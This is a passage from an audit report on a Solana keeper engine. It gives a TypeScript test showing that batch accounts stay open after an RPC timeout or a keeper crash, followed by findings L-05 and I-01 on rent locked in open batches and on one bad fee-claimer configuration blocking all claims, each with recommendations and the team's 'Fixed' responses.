const realClaim = { ...(await import("../engine/src/dbc/claim")) };
mock.module("../engine/src/dbc/claim", () => ({
  ...realClaim,
  // One claim per coin goes into the round's batch; once the owner approved, executing it lands 1,000,000 zats.
  dueClaimItems: async (epochId: string, coin: { mint: string }) => [
    {
      id: { epochId, mint: coin.mint, kind: "trading" },
      build: async () => ({ setupIxs: [], claimIxs: [] }),
    },
  ],
  claimCoinFees: async () => 1_000_000n,
}));
const realClaimers = { ...(await import("../engine/src/dbc/claimers")) };
mock.module("../engine/src/dbc/claimers", () => ({
  ...realClaimers,
  claimerFor: async () => batchClaimer,
}));

const db = await import("../engine/src/db");
const { batchMetaKey } = await import("../engine/src/dbc/squads");
const { ChainUnavailableError } = await import("../engine/src/rpcGuard");
const { runEpoch } = await import("../engine/src/epoch/engine");
if (!CHILD) afterAll(() => rmSync(TMP, { recursive: true, force: true }));

/** Epochs whose finishRound reached the claimer in THIS process. */
const finishCalls: string[] = [];
const behaviour = { rpcErrorsInClose: 0 };
let lastBatchIndex = 0;
/** Stands in for SquadsVaultFeeClaimer with PAD_CLAIM_BATCH=1: the parts of it the engine's round wiring calls. */
const batchClaimer = {
  publicKey: { toBase58: () => VAULT },
  advance: async () => {
    throw new Error(
      "not used: the claim transactions are stood in by claimCoinFees",
    );
  },
  async prepareRound(epochId: string, items: unknown[]) {
    // The batch, its proposal and one inner transaction per claim are created: their rent comes from the keeper (engine/README.md:
    // about 0.0045 SOL per inner transaction) and returns to it only when finishRound closes them.
    if (items.length > 0 && db.getMeta(batchMetaKey(epochId)) === null)
      db.setMeta(
        batchMetaKey(epochId),
        JSON.stringify({
          batchIndex: String(++lastBatchIndex),
          inners: items.length,
        }),
      );
  },
  async finishRound(epochId: string) {
    finishCalls.push(epochId);
    if (CHILD) process.kill(process.pid, "SIGKILL"); // the keeper is restarted here: a deploy, an OOM kill, a host reboot
    if (behaviour.rpcErrorsInClose > 0) {
      behaviour.rpcErrorsInClose--;
      throw new ChainUnavailableError(
        "timeout",
        "reading the batch's proposal did not answer in time",
      );
    }
    db.deleteMeta(batchMetaKey(epochId)); // closed: the inner, batch and proposal accounts are gone and their rent is back in the keeper
  },
};

/** The engine logs what it cannot send here (the snapshot memo: no Solana RPC, by design); muted to keep the output readable. */
async function quietly<T>(fn: () => Promise<T>): Promise<T> {
  const { error, warn, log } = console;
  console.error = console.warn = console.log = () => {};
  try {
    return await fn();
  } finally {
    Object.assign(console, { error, warn, log });
  }
}

// ---- One keeper run: the production runEpoch, default claim step. Solana-only rounds, holders opted in: their shares carry, no payout touches a chain ----
const noSwap: SwapAdapter = {
  provider: "near-1click", // never called: a Solana-only round has no swap
  quote: async () => ({ outZats: 0n }),
  submit: async () => {
    throw new Error("no swap in a Solana-only round");
  },
  status: async () => ({ status: "pending" }),
};
const isolation: IsolationDeps = {
  keeperZecBalance: async () => 10n ** 15n,
  treasurySpendableZats: async () => 10n ** 15n,
};
const keeperRun = () =>
  quietly(() =>
    runEpoch(noSwap, undefined, { includeShielded: false, isolation }),
  );

const HOUR = 3_600_000;
const T = Date.now();
const iso = (ms: number) => new Date(ms).toISOString();
const draft = (id: string, atMs: number) =>
  db.upsertEpoch({
    id,
    at: iso(atMs),
    coinMints: "[]",
    harvestedZats: "0",
    feeZats: "0",
    status: "harvesting",
    swapProvider: null,
    swapRef: null,
    swapState: "none",
    swapAmountOutZats: null,
    zcashTxids: "[]",
    includeShielded: 0,
  });
const batchOpen = (epochId: string) =>
  db.getMeta(batchMetaKey(epochId)) !== null;
const recorded = (epochId: string) =>
  db
    .listEpochCoinHarvests(epochId)
    .map((h) => h.mint)
    .sort();

if (CHILD) {
  test("child keeper process: one run, killed while it closes the round's batch", async () => {
    await keeperRun();
  });
} else {
  // Two coins on one config whose fee claimer is the vault, holder samples every 2 h (each 10 h round window holds 5).
  db.insertDbcConfig({
    configId: "CONFIG",
    feeBps: 100,
    feeClaimer: VAULT,
    migrationQuoteThreshold: "0",
    dammConfig: "DAMM",
    poolCreationFeeLamports: "0",
    createdAt: iso(T - 100 * HOUR),
    creatorFeePercentage: 25,
  });
  for (const mint of ["COIN_A", "COIN_B"]) {
    db.upsertCoin({
      mint,
      name: mint,
      symbol: "C",
      imageUrl: "",
      description: "",
      creator: "creator",
      createdAt: iso(T - 100 * HOUR),
      feeBps: 100,
      poolId: null,
      mintDecimals: 6,
      status: "pending",
      configId: "CONFIG",
    });
    db.markCoinLaunched(mint, `pool-${mint}`);
    for (let h = 50; h > 0; h -= 2)
      db.insertHolderSample(mint, iso(T - h * HOUR), HOLDERS);
  }
  for (const h of HOLDERS) db.upsertOptin(h.wallet, `utest1-${h.wallet}`);

  describe("L-05: a run that stops before finishRound leaves the round's batch open for good", () => {
    test("control: a round that runs through closes its batch", async () => {
      draft("epoch-1", T - 40 * HOUR);
      const out = await keeperRun();
      console.log(
        `[control] epoch-1 ${out.epoch?.status}, coins recorded ${JSON.stringify(recorded("epoch-1"))}; finishRound reached the claimer for ${JSON.stringify(finishCalls)}; batch still open: ${batchOpen("epoch-1")}`,
      );
      expect(out.epoch?.status).toBe("ok");
      expect(finishCalls).toEqual(["epoch-1"]);
      expect(batchOpen("epoch-1")).toBe(false);
    });

    test("bug: an RPC timeout while the batch is being closed; the next run finishes the epoch and never closes the batch", async () => {
      draft("epoch-2", T - 30 * HOUR);
      finishCalls.length = 0;
      behaviour.rpcErrorsInClose = 1;
      const err = await keeperRun().then(
        () => null,
        (e: Error) => e,
      );
      console.log(
        `[rpc] run 1 threw "${err?.message}"; coins recorded ${JSON.stringify(recorded("epoch-2"))}; epoch-2 is still ${db.getEpoch("epoch-2")?.status}; batch open: ${batchOpen("epoch-2")}`,
      );
      expect(err?.message).toContain("chain unavailable");
      expect(recorded("epoch-2")).toEqual(["COIN_A", "COIN_B"]);

      const out = await keeperRun();
      console.log(
        `[rpc] run 2 (RPC back): epoch-2 ${out.epoch?.status}; finishRound reached the claimer ${finishCalls.length} time for epoch-2 (the call that timed out); batch still open: ${batchOpen("epoch-2")}`,
      );
      expect(out.epoch?.status).toBe("ok");
      expect(finishCalls).toEqual(["epoch-2"]);
      expect(batchOpen("epoch-2")).toBe(true);
    });

    test("bug: the keeper process is killed while closing the batch; the restarted keeper finishes the epoch and never closes the batch", async () => {
      draft("epoch-3", T - 20 * HOUR);
      finishCalls.length = 0;
      const child = Bun.spawn([process.execPath, "test", import.meta.path], {
        cwd: join(import.meta.dir, ".."),
        env: {
          ...process.env,
          L05_ROLE: "child",
          L05_TMP: TMP,
          L05_VAULT: VAULT,
        },
        stdout: "pipe",
        stderr: "pipe",
      });
      await child.exited;
      console.log(
        `[crash] keeper process ended by ${child.signalCode} inside finishRound; coins recorded ${JSON.stringify(recorded("epoch-3"))}; epoch-3 is still ${db.getEpoch("epoch-3")?.status}; batch open: ${batchOpen("epoch-3")}`,
      );
      expect(child.signalCode).toBe("SIGKILL");
      expect(recorded("epoch-3")).toEqual(["COIN_A", "COIN_B"]);
      expect(db.getEpoch("epoch-3")?.status).toBe("harvesting");

      await Bun.sleep(1_100); // the restarted keeper takes the dead run's epoch lock over once it is stale (EPOCH_LOCK_STALE_MS)
      const out = await keeperRun();
      console.log(
        `[crash] restarted keeper: epoch-3 ${out.epoch?.status}; finishRound reached the claimer ${finishCalls.length} times for epoch-3; batch still open: ${batchOpen("epoch-3")}`,
      );
      expect(out.epoch?.status).toBe("ok");
      expect(finishCalls).toEqual([]);
      expect(batchOpen("epoch-3")).toBe(true);
    });

    test("bug: later rounds close only their own batch; the two left open stay open and nothing raises an alert", async () => {
      draft("epoch-4", T - 10 * HOUR);
      finishCalls.length = 0;
      const out = await keeperRun();
      const open = ["epoch-1", "epoch-2", "epoch-3", "epoch-4"].filter(
        batchOpen,
      );
      const inners = open.reduce(
        (n, e) =>
          n +
          (JSON.parse(db.getMeta(batchMetaKey(e))!) as { inners: number })
            .inners,
        0,
      );
      const alertKinds = [...new Set(db.listOpenAlerts().map((a) => a.kind))];
      console.log(
        `[bug] epoch-4 ${out.epoch?.status}; finishRound reached the claimer for ${JSON.stringify(finishCalls)}; batches still open: ${JSON.stringify(open)} (${inners} inner transactions, about ${(inners * 0.0045).toFixed(3)} SOL of keeper rent at the README's 0.0045 SOL each); open alerts: ${JSON.stringify(alertKinds)}`,
      );
      expect(out.epoch?.status).toBe("ok");
      expect(finishCalls).toEqual(["epoch-4"]);
      expect(open).toEqual(["epoch-2", "epoch-3"]);
      expect(alertKinds.every((k) => k === "snapshot_memo")).toBe(true); // only the memo this sandbox cannot send
    });
  });
}
```

</details>

The test demonstrates two failure cases:

- **RPC error:** Both coins are recorded, but `finishRound()` fails. On the next run, the epoch finalizes successfully without calling `finishRound()` again, leaving the batch open.
- **Keeper crash:** The process is killed during `finishRound()`. After restarting and taking over the stale lock, the keeper finalizes the epoch without retrying batch cleanup.

A subsequent epoch closes only its own batch. The earlier batches remain open, locking approximately 0.018 SOL across four inner transaction accounts. No alert is raised.

## Recommendation

Retry cleanup for every finalized epoch with an open `squads_batch:<epoch>` key, rather than relying only on coins admitted during the current run. `finishBatchRound()` already safely skips active or approved batches and previously closed inner accounts. Also, alert when a finalized epoch still has an open batch.

## Team Response

Fixed.

# [I-01] An Unresolvable Fee Claimer for One Coin Prevents All Coins from Being Claimed

## Severity

Informational Risk

## Description

Before claiming a coin's fees, the system resolves its fee claimer to determine whether it is authorized to receive them. This lookup can fail if the coin has a missing configuration or its configured fee claimer is no longer the current keeper key or the configured Squads vault.

The problem is that this error is not handled at the individual coin level. Instead, it aborts the entire claim process, including claims for other coins whose configurations are valid. The draft remains in `harvesting`, and every retry encounters the same error. Consequently, no holders receive their payouts until an operator fixes the affected coin's configuration or delists it.

This can happen if `SQUADS_MULTISIG` is changed while existing coins still reference the previous vault, or if a coin has no recorded DBC configuration. Keeper-key rotation can also cause this for coins configured with the previous keeper key, although mainnet uses the Squads vault. These are operator-side configuration issues, not conditions an external attacker can trigger.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L247`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L247)

File: [`engine/src/epoch/engine.ts#L90-L96`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L90-L96)

## Recommendation

Handle fee-claimer resolution failures at the individual coin level.

## Team Response

Fixed.
